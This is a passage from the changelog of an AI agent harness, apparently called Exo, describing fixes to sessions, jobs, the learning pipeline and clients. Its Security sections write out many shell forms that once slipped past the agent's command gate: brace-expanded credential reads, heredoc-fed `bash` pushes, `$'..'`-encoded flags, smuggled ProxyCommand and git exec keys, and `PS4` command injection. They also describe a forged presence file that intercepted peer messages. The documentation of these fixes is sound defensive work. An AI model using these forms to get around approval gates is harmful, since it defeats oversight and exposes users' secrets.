  "not run" result for a command that did run. The principal typing into a running subagent's session steers it,
  whatever the mode, and the terminal shows the line as a queued steer that up pulls back. Anyone else gets
  `forbidden`. While the child starts or finishes, no round can take a steer, so `turn.send` fails with `conflict`.
  It never starts a main-loop turn in the child. A send that waited behind a child that was locked meanwhile runs
  no turn. An unaddressed peer message never picks a subagent's session or a scheduled run: it goes to the user's
  live thread. With none live, a message delivered at once is refused and a held one waits with no thread.
- Opening a thread whose turn is still running (`/resume`, `/sessions`, `exo tui --session` or `--resume`,
  `exo chat --resume`) no longer writes "not run: session was interrupted" for the tool call in flight, so the
  model never sees two results for one call. `session.resume` still closes a round a crash left open.
- Two seats in one `$EXO_HOME` now run side by side. Each core numbered events from its own counter, so the core
  that fell behind failed every publish with a UNIQUE constraint error until it restarted. The database now numbers
  each event past the table's highest. `hello`, `events.subscribe` and `/health` report that highest number, so a
  window that joins one seat's core does not replay the other seat's job cards as new notes. Starting any core, even
  one that then failed the writer lock, also marked every agent's running delegate tasks failed. Now only an agent's
  writer fails its own leftovers.
- Scheduled jobs on a home with several seats: both seats' timers ran the same due job, and a job's `seat` was
  never read, so a job for one seat could run as another. A timer now claims the slot before it runs it, a
  seat-bound job runs only in its seat, `run_now` from another seat is refused, and `add` refuses a seat no core
  could run.
- Background jobs (D-032): shutting down exod with a job running no longer sends the thread a "was killed"
  notice. With `wake` unset or on, that notice started a model turn while the engine was closing, a paid call
  at every such shutdown. The job now ends with one `killed` record and one `job.updated`. Once shutdown has
  begun no job notice starts a turn. A notice still in delivery is queued for the next one.
- Scheduled jobs when clocks go back: a cron job added, resumed or overdue in the repeated hour's second pass got
  a next run in the hour's first pass, up to an hour in the past, so the timer ran it again each time a run ended
  until that hour was over. The next run is now always later than now (`docs/SCHEDULE.md`, "Clock changes").
- A second `exo serve --seat NAME` beside a running exod no longer takes over its socket and `run/exod.pid`. It
  deleted the live core's `run/exod.sock`, bound its own and wrote its pid, so `exo stop` stopped the second core
  and left the first running with the agent's writer lock and no way to reach it. `exo serve` now refuses a socket
  that another core answers on, exits 1 and names `--socket`, and a core removes `run/exod.pid` on exit only if
  the file still holds its own pid.
- Trace (D-025, D-032): a model call stopped with ctrl+c or `/stop` is now recorded, whether the stop came mid
  stream, before the first token or in the backoff before a retry. It gets a `model.call` event with `stop_reason`
  `interrupted`, and its time counts in `model_ms`. Before, the wait counted as harness overhead, so stopping a slow
  model after 30 s filed a false `turn.slow` finding and could reopen a fixed one. The record keeps the routes that
  timed out or failed before the stop, so stopping the fallback route still flags the route before it. A call whose
  only tries timed out files no `model.slow`, because `model.timeout` already names that route. The `/trace`
  header names the route that served the last call, not "no model call recorded yet", after a stop.
- History brought in with `exo ingest` now feeds the rule of three in `exo consolidate`. Ingest writes your own
  messages with role `principal`, and consolidation read only role `user`, so an import never drafted a belief. Rows
  read before this fix are not in the cluster cache: delete `<store>/proposals/state.json` and the next run rebuilds
  it from them. Superseded text does not count: the older versions of an edited ChatGPT prompt, and Hermes rows
  marked inactive. Imported evidence carries the time you said it, not the time of the import. Promotion rule 4
  never applies a lesson whose evidence is all imported: you review that first batch. Only the nightly climb can
  add such a lesson, and only when the eval shows it helps.
- The nightly climb follows rule 5 and D-054. It no longer adds a gated lesson (a type in `eval_gate_for` or a
  domain in `high_impact_domains`) or one with a critic objection: rule 5 alone promotes those, with its critic,
  weight, session and held-out checks. A climb candidate with no held-out case in its domains fails the gate
  instead of passing on zero cases. A climb promotion records the lesson's real type and domain for the brief.
- Eval cases respect authorship (D-040): a replay comes only from the principal's own verdict, answer or ruling,
  asked by the principal's own message. The agent's `exo_should_have_been` reports and peer messages no longer
  become gold answers for the climb, the rule 5 gate or the regression check.
- A lesson's own evidence is no longer its proof: the rule 5 gate and the climb ignore the replay or preference pair
  built from the verdict the lesson cites. This holds when the climb adds a lesson and when it drops one. A skill
  whose only held-out case was its own evidence now fails the gate.
- The climb's cached incumbent scores are scored again when the eval cases' contents, the checks, the rubric, the
  judge samples or the main or eval route models change. Before, only the config and the case ids were checked,
  so a lesson that changed nothing could be kept against stale scores.
- The judge score parser no longer misreads plain judge replies. "0.9 - nothing wrong with it" and "On a scale of
  0 to 1, 0.8" scored 0, and "Not correct." scored 1. A named scale is now only a label, "nothing wrong" does not
  count as wrong, and "not correct" does. A number that opens the reply is the score.
- A store made with `exo init <id> --root DIR` or `exo import-store --root DIR` is found by its id. Both record DIR
  in config `principals.<id>`, but nothing read it: the store commands said "no principal store", exo-memory and
  learning were off, `exo memory verify` said "nothing to verify" while the store's ledger went unchecked, the
  command center's decisions panel showed an empty queue, and check-prose skipped the store's internal names. Every
  reader now maps an id to its store through `exo.store.principal_root`. If you followed the old hint and made a
  second store under `$EXO_HOME/principals/<id>`, `exo config unset principals.<id>` goes back to that one.
- Recall sees beliefs accepted after the first turn. exo-memory read the belief nodes once per process, so a lesson
  that `exo proposals accept` or learning's own promotion wrote never reached recall until a restart, a reverted one
  kept showing, and an edited node showed its old text. It now reloads when a node file was added, changed or removed
  (`PrincipalStore.refresh`). The pack stays built once, for prompt caching. Learning's `proposal_accept` also
  lints and links against the disk, so a node removed by another process no longer breaks a promotion.
- Terminal event feed: a boot that failed after `hello` left the window without its feed, so `/new` and a message
  worked but no reply or approval card ever showed. The feed now starts whatever the boot does, and a `--session`
  id the core does not know opens a new thread and says so. One event the window cannot read no longer ends the
  feed either. Under `strict=False` a Literal value the client does not know (such as a newer core's `ui.panel`
  kind) is kept, `Client.events` skips and logs an event that still fails to decode, and a feed that dies says so.
- The web Chat view draws a peer, bus or job message as a card with its real author, never as a line the user
  typed: on reload and thread switch too, and the live `peer.message` and its stored message are one card. An
  approval with no thread (a held peer message that no live session could take) shows in every thread, as in the
  terminal client, and allow now delivers it into a new thread of the seat instead of closing it as denied. If that
  thread cannot open, the message closes as not delivered and a notice says why. A panel you dismiss stays closed
  after the next panel event, a tab switch or a reconnect.
- `exo web` folded the core's replayed events into its state a second time after the core's stream dropped: message,
  tool call and task counts doubled, and a session stayed `waiting` after its approval was answered. Each event now
  counts once, and a core whose log is behind the page (a new `EXO_HOME`) starts the page over.
- A web chat reader that fell 1000 events behind lost one event for good. Its stream now ends with nothing lost, and
  the reconnect replays every event it had not received.
- Terminal thread switching (D-045, D-032): opening a thread (`/resume`, `/sessions`, `/fork`, `/open`,
  `--session`, `--resume`) shows the approval it still waits on, from `approvals.list`, and `LIVE` when a turn runs
  there, so ctrl+c stops it. `session.get` and `session.resume` now carry `status`, as `session.list` does. Before,
  such a request had no card and the turn waited for good. Leaving a thread drops its turn state, card, queued
  steer and numbers: the new thread no longer shows `LIVE`, `running tool` or steer mode once the old turn ends,
  and `COST` no longer shows the other thread's dollars. A thread opened again keeps its `COST` and the `+` for an
  unpriced call. An answer the core refuses brings its card back. A card with no thread (a held peer message) now
  stays in every thread, a new thread and a window started on one included. Before, the window's check against
  `approvals.list` dropped it within seconds. A
  finished subagent whose calls had no price adds the `+` to `COST`, and its roll-up no longer moves `MEM`.
- `exo update` no longer widens a `--plugins` install to every plugin. The installer records the list in
  `config.json` (`plugin_selection`) and a re-run without `--plugins`, such as the one `exo update` makes, keeps it.
  A list also removes the plugins an earlier run installed in `$EXO_HOME/plugins` and the list leaves out, since the
  core loads every folder there. `--plugins all` goes back to every plugin. The re-run also refreshes the plugin copies
  in the Hermes home an earlier `--with-hermes`, `--hermes-home` or `EXO_HERMES_HOME` run used (one inside `~/.hermes`
  still needs `--hermes-home`). An install from before this change has no list on record, so its first update installs
  every plugin: after it, re-run `install.sh --no-pip --plugins LIST` once to go back to yours. A list ignores spaces
  and always keeps `exo-gate`, since without it the core refuses every tool call. A name given with `--plugins` that
  matches no plugin stops the installer before it removes a plugin or writes config.json. A remembered name only
  warns.
- A `--plugins` list, or the one `exo update` keeps, no longer deletes your copy of an installed plugin (#268).
  `cp -r` copies the hidden `.exo-managed` marker, so a copy such as `my-bus` made from `exo-bus` looked like a
  plugin Exo installed and was removed with exit 0. A plugin folder is now removed only when its marker names that
  folder, as for pack skills, and a copy is kept with a warning. A marker from an install before markers named
  their folder cannot tell Exo's plugin from a copy. That folder is kept too, still loads, and a warning names it:
  delete it yourself if Exo installed it. A plugin still in the list gets a named marker on that run.
- `scripts/deploy-site.sh` no longer tags and pushes a version after a failed deploy, which burned the version and
  exited 0. A failed copy or deploy now exits non-zero before tagging, a failed tag push exits non-zero, the script
  refuses to run without `rsync` (it used to deploy a near-empty site), and a versioned deploy refuses uncommitted
  changes under `site/`.
- Two processes opening one `sessions.sqlite` at once no longer crash (#246). The second core, seat or client
  died with "duplicate column name" when both added a column a new or older file lacked, or with "database is
  locked" when both switched a new file to WAL. The columns are now added in one write transaction, and a busy
  switch to WAL is tried again for up to two seconds.

### Security
- `exo web` no longer puts the page token in the browser launcher's argv, which other users of the host can read in
  `/proc` (#166, D-039). The browser opens a one-time launch code (`#code=`, one use, 120 seconds) that the page
  trades for the token over loopback; a code used twice replaces the token and warns in the terminal. Replacing the
  token ends every other connection, including a request that passed the token check and still waits for its body,
  and a body is checked against the current token again once read. The warning shows only when the launched page
  redeems the code too, so a browser that runs no script (a text browser) gives none. The printed `#token=` link is
  unchanged. Unless `--host` is `127.0.0.1`, `localhost`, `::1` or a wildcard bind, no browser is opened; use the
  printed link. A refused browser link tells you to paste the printed link into the tab, not click it in the
  terminal (a click hands the token to the URL opener's argv).
- An `ssh` or `mosh` chain with more hops than the gate reads (four) is `opaque_exec` and asks, keeping the
  `remote host` exposure and the first host as target; it used to pass as plain `shell` (#153, D-038).
- Options of trusted programs that run a command are followed as nested commands: `tar --to-command`, `-I`,
  `--use-compress-program`, `--rsh-command`, `--rmt-command`, `--set-mtime-command`,
  `--checkpoint-action=exec=`; `split --filter`; `sort --compress-program`; `man -P`/`--pager`; `rsync
  -e`/`--rsh`/`--rsync-path`; `scp -S`/`-D`, `sftp -S`/`-D`; `ssh`/`scp`/`sftp -o
  ProxyCommand`/`LocalCommand`/`RemoteCommand`/`KnownHostsCommand`, spelled as ssh's config reader takes them
  (`-oProxyCommand=cmd`, `'ProxyCommand = cmd'`, a quoted or indented keyword, any case); `git rebase -x`, `git
  bisect run`, `git submodule [-q] foreach`, `--upload-pack`, `--receive-pack`; `rg --pre`; `zip -TT`; a `!`
  anywhere in the keystrokes of `less +cmd` or macOS `more +cmd` (`+G!cmd`); the `sqlite3`/`duckdb` `.shell`
  and `.system` dot-commands and `.once`, `.output`, `.import`, `.read` with a `|command` (after options too);
  `psql -o`/`--output '|cmd'`, `\!`, `\o`, `\out`, `\g`, `\gx` (with options), `\w`, `\write` with a pipe,
  and backquotes in meta-commands, anywhere on a line, and `mysql system`; and `GIT_SSH_COMMAND`, `RSYNC_RSH`,
  `PAGER` and the other command-valued variables set before the program. Options are read as each program's
  `getopt` reads them: abbreviated long options (`--to-com=`, `psql --o`), values attached inside a short-option cluster
  (`-xIcmd`), tar's old style (`tar xIf cmd`), and the program's own value-taking options, so a value or ssh's
  remote command is not read as an option (`ssh host curl -I URL`, `ssh -oServerAliveInterval=60 host ls` keep
  their classification). Values the gate cannot read ask (#154, D-038).
- Environment dumps (`printenv X`, a bare `env`, `set`, `export -p`, `declare -x`) are `credentials` behind
  `uv run`, `poetry run`, `pdm run`, `pipenv run`, `hatch run`, `coproc`, `sudo`, `nice`, `timeout`, `env` and
  the other prefixes, and inside `if`/`for`/`while` bodies, as they are on their own (#155, D-038).
- Gate (#184, D-038): brace sets are expanded as bash does before a path is matched against the secret stores.
  `cat ~/.config/gh/{hosts,x}.yml`, `cat ~/.docker/{*,}`, `cat ~/{},.netrc}`, `cat ''{},.env}`,
  `cat $""{.env,x}` and `cat .{d..f}{m..o}{u..w}` were allowed reads, as was `ls /srv/exo{007..1000..993}/keys`
  with `EXO_HOME=/srv/exo0007` (bash pads the sequence to `0007 1000`); they are `credentials` now and ask. A shell
  word is expanded from its source text, so quoted and escaped braces stay literal and keep their class; the
  word as written is still checked, and `$"..."` is also read as plain `"..."`. A word that expands past 1,024
  words, 32 levels of nesting, a sequence bound over 18 digits or a zero-padded bound past a 32-bit int (bash
  wraps those), and any brace word after one tool call has expanded 4,096 words in all (globs count more), asks
  as a secret-store path; so does `echo {1..2000}`, and so does a string literal in code holding compact JSON
  with 11 or more objects, since code literals are read as shell commands.
- Tool subprocesses no longer see git's environment config by default (#159): `GIT_CONFIG_VALUE_<n>` and
  `GIT_CONFIG_PARAMETERS` can carry credentials (`http.extraHeader`) and used to pass. A seat keeps the numbered
  family with `[tools] env_allow = ["GIT_CONFIG_COUNT"]` and `GIT_CONFIG_PARAMETERS` by naming it.

### Security
- A forged presence file could take a send and answer for another seat's name (#523, on #132). `PeerNode.send`
  shipped the message text to whatever socket the peer's presence file named, for any name, including one whose
  key this home pins: a same-user process wrote a presence file for that name with a socket of its own, and read
  every message sent to it. And a send's first answer was published to the sending model unsigned, so that socket
  could report any outcome and detail; later receipts were already checked. Now a daemon signs its presence entry
  with its seat key, and the text ships only when that entry verifies against a key this home pins for that seat:
  a file that holds another key, or the pinned key's public half copied beside a socket of its own, or no
  signature at all, gets nothing, and nothing of its answer runs. The socket shipped to is the one inside the
  entry that verified, re-read at send time, not the one an earlier scan saw. The receiving seat signs the first
  answer like a later receipt (`msg_id`, `state`, `detail`, `mode`, `session`, `by`, `daemon`, `ts`), and the
  sender verifies it against the keys pinned here for the seat the message went to, as `receipt` does. A reply
  that does not verify is not published, and the send fails. For a seat no key is pinned for, both checks step
  aside and the receive side's trust ladder decides what arrived, as before (an unpinned sender is held as
  `other`). Stricter than before for two honest setups: a daemon whose presence file or first receipt is unsigned,
  as an older `exo`'s are, cannot be reached for a pinned seat, and neither can a seat whose key was made again
  until the new key is pinned here (`exo keys pin <seat> <pub> --replace`, USER-GUIDE §7) (D-026 amendment;
  `docs/PEERS.md` "Limits").
- A signed first reply is no longer a receipt (#603 review, on #523 and #132). Since #523 a daemon signs its first
  answer to any `deliver`, an envelope that does not verify too, and the answer had a later receipt's fields, so a
  client of a daemon's socket could read a held message's id from its `peers list`, send it a junk envelope with
  that id, and hand the signed `denied` to the sender's `receipt`: the sender published `denied` for a message
  still held, against #132's rule that a later receipt comes only from the seat the message went to. The first
  answer now signs `kind: "reply"` and a later receipt `kind: "receipt"`. `receipt` refuses a reply, and the send
  path refuses anything but a reply. An older `exo`'s receipt, which names no kind, is still taken; a #523 build's
  first reply names none either and is told apart by the `mode` and `session` it signs, so `receipt` refuses it and
  a send to a #523 build still completes. A send that fails on its first reply has already delivered the text; the
  user guide now says to check with the peer before sending again. Also: a presence entry's signature is checked over
  its JSON as written, so a newer `exo` that signs an extra field still verifies, and a first reply that is not a
  mapping fails the send with a plain error (D-026 amendment).
- `exo chat` approvals no longer fail open. A reply that only starts with a or y (`abort`, `yeah no`) used to
  approve. Now a reply is an option as shown, in any case, or `a`, `y` or `yes` for allow, and anything else
  denies.
- Skill gates fail closed. The draft pipeline's prose gate passes only when `check-prose.py` exits 0. Before, it
  passed whenever the output held the word "clean", so a draft named `cleanup.md` passed with findings. A missing
  `check-prose.py` now blocks, as does a missing `check-mermaid.py` when the draft has a mermaid fence. Both were
  skipped, so a partial install posted unchecked drafts. `--allow-identifier` exempts only the token it names:
  allowing `localhost:8080` no longer hides `localhost:9999/secret`, and a refused hit names the whole token.
  Internal names that start or end with `.`, `~` or `@` now match, in `check-prose.py` and in the draft pipeline.
- File tools: a write no longer follows a link planted at its temp name (`.<name>.exo-tmp`), which sent the
  bytes, and the file's mode, to wherever the link pointed while the gate had classified only the named path. A
  write to a symlinked file is refused with the link's target named, instead of replacing the link with a regular
  file and leaving the target unedited. `read_file`, `edit_file`, `apply_patch` and `grep` refuse or skip FIFOs and
  devices, which hung the core (cancel could not stop it) or read `/dev/zero` until memory ran out. All but `grep`
  refuse files over 50 MB, also a file that grows past that while it is read. `code_find` passes the question to
  jg after `--`, so a question such as `- --include-sensitive` can no longer turn off jg's sensitive-file filter
  (docs/TOOLS.md).
- Streamed `bash` output no longer leaks a known key split between two reads. The output went out per 64 KiB read
  and each piece was redacted alone, so a key that crossed a read edge reached clients and sessions.sqlite in two
  halves. A read now holds back an ending that could start a key until the next read. Key redaction now finds every
  key in the text itself and puts the `[redacted]` markers in after, so a key no longer matches across a marker.
  Output changes only for a key value that holds `[` or `]` or is part of the word "redacted". The stream is cut
  only where no match that redaction could take crosses the cut. So the stream equals redacting the whole output for
  any set of key values known when the command starts, also when keys nest, overlap in a chain or hold `[` or `]`. A
  key value learned while the command runs is cut out only inside one piece. The stream and the result also decode a
  character split between reads (non-ASCII output got U+FFFD there). The result is still redacted after a tool cuts its
  output, so a key split by that cut (for example, `bash` keeps 15,000 characters at each end) leaves a part in the
  result, as before. See docs/TOOLS.md "Streamed output". A background job's completion notice had no key redaction. It
  now cuts known key values out of its command and its whole log before it cuts them to size (docs/JOBS.md).
- The gate's decision call no longer falls back to the main model (D-081). With no decision or aux route, the rule
  outcome stands and no model is asked. The rules still apply in full, since a model could only make an outcome
  stricter (D-015). A setup with only a main model loses that second opinion: the main model no longer turns a
  call the rules allow into an ask (`docs/GATE.md`).
- Gate: a heredoc or here-string after a compound command's closing `}`, `)`, `done`, `fi` or `esac`, and text piped
  into a compound, now reach the commands inside it (#161). `{ bash; } <<'EOF'` with `git push origin main` in the
  body was `opaque_exec` (ask) and slipped past `deny: [vcs_push]`; it is now `vcs_push`, as `bash <<'EOF'` is.
  Commands that do not run their input (`{ cat; } <<EOF`) keep their class, and a command whose stdin is already
  set (its own heredoc, here-string or `<`, a pipe inside: `{ curl ... | bash; } <<< 'ls'`, or an earlier
  `exec < file` however spelled, or an eval, source, `.`, variable program or function that may run one) is not
  fed and stays `opaque_exec`, as is the whole compound when its closer has its own `<`. Past a closer heredoc on
  another fd (`3<<EOF`, read as stdin), text piped in reaches only the first command inside. Each fed text is read
  once per line, also by the `sqlite3`, `psql` and `mysql` clients in a group (#154), yet still counts for every
  command it reaches, so a later client or interpreter whose argument is a store folder stays `store_write` (which
  outranks `delete`; `deny: [delete]` still denies it through its delete part, D-075). The parser stays linear in
  the length of an unbroken word (base64, a long path).
  For fed shells and interpreters, a `deny: [opaque_exec]` entry still denies these compound lines
  (D-075). Under `categories: {opaque_exec: deny}` or a rule they now ask where they were denied,
  as `bash <<EOF` already does, until #191. The #178 floor keeps those lines at ask when
  `opaque_exec` is named at `ask` or `deny`, rather than falling to the push's own `log`.
  Fed SQL clients follow their plain-input classification, without that floor. A compound feeding
  `\! git push origin main` to `psql` can change from ask to the push's `log`. D-075 `deny` and
  `reserved` entries still match every retained part. Category overrides and ordinary rules use
  the combined classification (`docs/GATE.md` "Shell commands: an allowlist").
- Unix peer authentication (#175, D-060): principal clients ask the kernel who serves the socket before the
  credential moves, and the core asks who connected before it stamps the principal. The credential file
  (`run/<socket>.principal.key`) is now a JSON launch record, so restart the core and every running `exo`, `exo web`
  and `exo chat` after updating: a new client refuses an old core (the page says to run `exo stop`), and an old
  client against a new core is quietly local. Protocol additions: `hello` reports `instance` and `heartbeat`, the
  event stream opens with a comment naming both, `approvals.list` returns a `cursor`, and the Python client ends a
  stream with no event or heartbeat for 45 s. Event frames are raw UTF-8, and a frame too large to read is skipped
  instead of stalling the stream, also for a caller that keeps its own cursor (the exo-bus channel, so bus replies
  after it still go out). A joined terminal window never resends a turn or approval answer whose reply was
  lost; it says so and keeps the text. Under `hidepid` or `ProtectProc` clients are local, with the reason logged and
  named in refusals (`/rename` and the subagent verbs included, even when the core's stderr is closed).
- Gate (#178, D-038): naming `opaque_exec` at `ask` or `deny` (a category line or a rule) no longer turns off the
  indirection floor. Before, `categories: {opaque_exec: deny}` let `bash -c 'git push origin main'` log. Only
  lowering `opaque_exec` to `log` or `allow` turns the floor off, as before.
- The run folder is a secret store, like `~/.ssh` (#169, D-039). The folder itself (`$EXO_HOME/run`, `.exo/run`,
  `$EXO_HOME/principals/<name>/run`, in any spelling such as `run/`, `run/.`, `run/jobs/..` or `..` after a
  symlink to `run/jobs`, also one right in `~`), its credential files (`exod.principal.key`,
  `<socket stem>.principal.key`, `exod.token`) and a wildcard there that could match one (`run/*`,
  `run/exod.principal.k*`, `run/exod.tok*`,
  `run/agent-default.principal.k*`, and the same for `$EXO_SEAT` and up to 64 seats under `$EXO_HOME/seats`,
  the first 64 by name once other files there are skipped) are
  `credentials` and ask, also nested in `bash -c`, `$( )`, interpreter code and `execute_code`. Before, only a
  call that named the key file asked: `cat $EXO_HOME/run/*`, `grep -r . $EXO_HOME/run` and the built-in `grep` or
  `glob` on the folder were allowed reads.
  Deletes, moves and replacements of the run folder or its credential files (`rm -rf ~/.exo/run`,
  `rm ~/.exo/run/*`, `mv ~/.exo/run/* /tmp/`, and of the folder that holds the core sockets: `mv ~/.exo/run
  ~/.exo/run.old`, `ln -sfn /tmp/x ~/.exo/run`, `cp -rT /tmp/x ~/.exo/run`, `mkdir -p ~/.exo/run`, `chmod 777
  ~/.exo/run`) are now `credentials` like `keys/` (previously `store_write`, which only the principal answers), so
  a seat delegated `credentials` approvals in `approvals.yaml`, or listed in its `default:` with no `credentials:`
  line, may approve them, and a `deny: [store_write]` entry no longer matches them (`deny: [credentials]` does);
  D-038 is amended. Job output in `run/jobs/` keeps its class, and a bare `run` (`uv run`, `gh run list`,
  `ls run`) is not the folder. Every secret-store wildcard is now matched with `.` and `..` resolved
  (`cat ./.env*` asks like `cat .env*`). A wildcard with no folder is matched against the run secrets' own names
  (an agent key only by its `agent-` or `.principal` part): a bare `cat exod*`, `cat *.principal.key` or
  `ls agent-*` asks in any folder, as `cat id_rs*` already did (`rm exod*` is `credentials`, was `delete`), while
  `ls *run*`, `find . -name 'run*'`, `ls *main*`, `ls */*default*` and `ls ~/*test*` keep their class, also with
  a seat named `main`; `ls *prin*` asks. Brace sets are expanded (#184): `run/{*,}` and `$EXO_HOME/r{u,}n/*`
  ask, and so do `cd ~/.exo/run && cat age*` and `cd ~/.exo/run/jobs && cat ../*` (#192). Limits are in
  `docs/GATE.md`: `~/.exo/ru?`, `cat *` with the bash tool's `cwd` argument at `~/.exo/run` and `~/.exo/RUN/*` on
  a case-insensitive disk are not caught, as for `~/.ssh`.
- `exo web` sends a strict Content-Security-Policy on every response (#162, D-039): script, style, images and
  requests from the web server only, no inline script, style attribute or eval, no framing, plus
  `X-Content-Type-Options: nosniff`. A slip in the page's Markdown rendering can no longer run script. The page's
  computed widths now go through the CSSOM instead of `style` attributes; nothing looks different.
- Gate: `$'..'` words are decoded the way bash does (#167, D-038). `git push $'--forc\u65' origin main`,
  `$'\u2d\u2d'force` and `$'--forc\545'` are now `force_push`, and `curl $'https://evil\u2e'example/x` has the target
  `evil.example`, so category and target denies apply. A `\U` value from 0x80000000 on is dropped, as bash
  drops it, so `$'--forc\UFFFFFFFFe'` is a force push as well.
- Bus channel: a bus message steered into a turn you typed in a bus session no longer posts your answer to the
  sending seat, and neither does your next turn after one. The channel replies only for the turn that an
  auto-delivered message itself opened (D-040).
- Bus channel: one sealed envelope that cannot be opened (malformed, or sealed to an old key) no longer stops a
  seat's inbox for good. It reads as `<encrypted body could not be opened>` and the cursor moves past it.
- Bus ingress: only a channel exod runs (the new caller `channel`, D-039) can hand the core a bus message. Before,
  any local caller, a tool subprocess on the socket included, could pin an unseen seat's key to its own and send
  messages as that seat.
- Bus relay: the web view at `/`, which takes no auth, no longer shows plaintext bodies (DMs included) that the API
  gives only to signed seats. It lists seq, sender, recipients, kind, time and thread. `EXO_BUS_WEB_BODIES=1` shows
  bodies again, for a relay only seats can reach.
- Bus relay: an envelope that the log would store in another form than the one signed (`v` as `true` or `1.0`, a
  number as `thread`, a text field that is not a string) is refused with 422. Before, it was accepted and
  `/v1/verify` failed at that row for good. Wrong types that crashed the handler with 500 get the same 422.
- Signed updates (#42, D-073): an OpenPGP or X.509 signature on the update target was checked by gpg against the
  local keyring and never against the pinned trust list, so a key you had only imported passed. Only SSH signatures
  from the pin count now. A `config.json` that exists but cannot be read no longer turns `update.require_signed`
  off: `exo update` refuses until it is fixed, and `--dry-run` says whether the check is on. `exo update
  --pin-trust REV` no longer adopts any commit's list: once a pin exists, the commit that set the list must verify
  against it (`docs/INSTALL.md`). A signed commit whose message is not UTF-8 is no longer refused. A trust list
  that is not UTF-8 is refused before anything is written, and no `allowed_signers.tmp` is left behind.
- Rebuilding the rule-of-three cache (`proposals/state.json` missing or stale) counts only your own utterances
  (D-040). Before, a rebuild also counted Hermes briefs of doubtful authorship (`hermes:unverified-user`) and peer,
  bus and job turns, so one matching sentence from you could complete a rule-of-three proposal, which promotion
  rule 4 could then apply with no review. Summaries from an import (`secondary`) do not count either.
- `exo taste export-house` no longer ships the principal's own name, organisation or email domain. Onboarding
  writes them into the body of `person/identity` and the `PRINCIPAL.md` heading, and the deny list read neither. Now
  the heading name (also when half filled in) and the domain of every email address fail the export. The words of
  the onboarding name and role answers hold an item for review, read from the ledger too when the node withholds an
  answer with a phone number. So do the labels of an email domain (`acme` of `mail.acme.io`): its parent domain
  `acme.io` holds but does not fail. A generic word in an answer ("team") only holds, a value item too, and never
  fails the built-in house soul. While the heading is still the template's, the name answer
  gives the name written as one word (`quillvarden`, held) and the initial plus surname (`qvarden`). These terms
  also match when joined to another word by `-` or `_` or to digits, as in a handle or a repo name. The initial
  plus surname fails only as a handle (`@alee`, `alee42`), and an email domain matches only as written, so `me.com`
  does not fail "Show me commands".
- The gate protects a store made with `--root` (config `principals.<id>`) as it protects the stores in the home: its
  policies, state, keys and ledger. It also reads that store's policies. A recorded root that names an unknown user
  (`~nosuchuser/x`), holds a NUL byte or is relative is skipped, and the id falls back to
  `$EXO_HOME/principals/<id>`. Such a root no longer stops the gate and every store reader with an error.
- Gate (#224, D-038): brace sets are expanded as bash does before a write is matched against the Exo store, as
  #184 does for secret-store reads. `echo x > ~/.exo/polic{i..i}es/default.yaml`,
  `cp x ~/.exo/{state,zz}/approval-grants.json`, `dd of=~/.exo/polic{i,x}es/default.yaml` and a `write_file` to
  `~/.exo/{policies,x}/default.yaml` were allowed local writes, so one tool call could rewrite the gate's policy
  or grants without a card. They are `store_write` now and ask the principal. Quoted and escaped braces stay
  literal, as in bash. The store checks have their own brace budget, so no secret-store outcome changes.
- Environment variables that load code or move where programs and config are found (`LD_PRELOAD`, `PATH`,
  `PYTHONPATH`, `NODE_OPTIONS`, `BASH_ENV`, `HOME` and the rest of the audited list in `docs/GATE.md`) are
  `opaque_exec` and ask, named in the summary, when set before a program, through `env`, `sudo` or `timeout`,
  exported or bare (`export -p` and `readonly -p` assign too), as a parameter-expansion assignment
  (`${PATH:=.}`, `${PATH=.}`), through `read`, `printf -v`, a `for` loop or a nameref, or as an integer through
  arithmetic, an array subscript or a `{PATH}>` redirection (`$((PATH=10))`, `a[PATH=10]=1`). So does an
  exporter, `read` or `printf -v` name the gate cannot read, whether spliced from a variable (`export $X=...`)
  or a glob the shell expands first (`export PAT?=.`, `read HOM[E]`). So do `MANOPT`, `ZIPOPT`,
  `RIPGREP_CONFIG_PATH`, `LESS` with a
  `+` command, and a non-empty `CDPATH`, which moved a `cd` into the Exo store unseen. More command-valued
  variables are read as commands (`GIT_PROXY_COMMAND`, `GH_PAGER`, `PSQL_PAGER`, `SUDO_ASKPASS`...). Git config
  from the environment (`GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>`, `GIT_CONFIG_PARAMETERS`), `git
  --config-env` in both forms and `git clone --config`/`-c` take the `git -c` exec-key check, and the value of
  an exec key is classified as a command, `git -c` included, so a `deny: [delete]` fires on it. A key that loads
  another config file or a template (`include.path`, `includeIf.*.path`, `init.templateDir`) asks, as do `git
  clone --template` and `git init --template`. `git config set`, `-f FILE`, `-t X`, `--type X` and `--default X`,
  also abbreviated as git allows (`--fil`, `--ty`), no longer hide the key, `git config rename-section` asks, and a
  value `git config` sets for an exec key is read as the command it is. More keys run a command: any whose last part
  ends in `command` or `cmd` (`gpg.ssh.defaultKeyCommand`, `core.alternateRefsCommand`), `interactive.diffFilter`,
  `remote.<name>.uploadpack`/`receivepack` and a tool's `.path`; `protocol.allow`, `protocol.ext.allow`, an `ext::`
  URL rewrite or remote URL and `GIT_ALLOW_PROTOCOL` ask, since an `ext::` URL is a command git runs. A quoted
  `NAME=VALUE` after `env` or `sudo` is the assignment those programs read it as.
  `PS4` is read as the text bash expands before every traced command, so `export PS4='$(rm -rf x) '; set -x` is a
  delete; `$((PATH++))`, `$((--PATH))` and `$((PATH<<=1))` assign too. A value that changes nothing keeps the line's
  class: an empty loader variable (`LD_PRELOAD= ls`), `GIT_CONFIG_GLOBAL=/dev/null`, a `PATH` of `$PATH` and system,
  virtualenv or `node_modules/.bin` folders, and `PYTHONPATH` before `pytest` or `python -m pytest`; any other
  `PATH` folder (`export PATH="$HOME/.local/bin:$PATH"`), an empty `PATH` element, a folder written with `..` and a
  `$PATH` bash does not expand (`export PATH='$PATH:/usr/bin'`) still ask.
  `IFS=`, `CDPATH=`, `LESS=-R`, `PAGER=cat` and other harmless assignments are unchanged, and so is text bash
  does not expand: single-quoted text (also inside an unquoted `${a:-'...'}`), a quoted here-doc and a bracket
  outside a subscript, so `git commit -m 'read ${PATH:=.}'`, `pytest -q 'test_x[HOME=/tmp]'` and `echo [HOME=x]`
  stay `allow`. A
  partly quoted value loses its quotes as bash removes them (`${GIT_SSH_COMMAND:=rm' -rf x'}` is `rm -rf x`).
  The scan is linear in the line, so a long run of unclosed or nested expansions cannot stall the gate hook.
  The rarer expansion forms that can still set a variable unseen are listed in `docs/GATE.md`. This is the inline
  form, distinct from #135, which drops `BASH_ENV` inherited from the parent environment (builds on #154,
  D-038).
- The web Command tab granted `allow always` on one click, with no confirmation, and showed only 160 characters of
